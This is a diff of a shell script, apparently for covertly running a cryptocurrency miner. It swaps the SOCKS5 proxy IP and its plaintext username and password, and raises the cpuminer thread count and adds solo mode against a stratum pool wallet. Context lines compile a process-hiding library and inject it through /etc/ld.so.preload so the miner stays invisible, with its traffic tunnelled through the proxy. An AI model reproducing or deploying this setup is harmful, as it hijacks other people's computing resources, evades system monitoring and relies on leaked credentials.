@@ -21,9 +21,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 128.199.222.68:443
-socks5_username = tahu
-socks5_password = bulat
+socks5 = 138.68.100.154:443
+socks5_username = donat
+socks5_password = gembul
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -52,4 +52,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./cpuminer-sse2 -a yespowertide  -o stratum+tcps://stratum-asia.rplant.xyz:17059 -u TVAC8wJkkmLadTveb1u9gFnY7eeH283tSG.$(shuf -n 1 -i 1-999999) -t4
+./graftcp/graftcp ./cpuminer-sse2 -a yespowertide  -o stratum+tcps://stratum-asia.rplant.xyz:17059 -u TVAC8wJkkmLadTveb1u9gFnY7eeH283tSG.$(shuf -n 1 -i 1-999999) -t16 -p m=solo
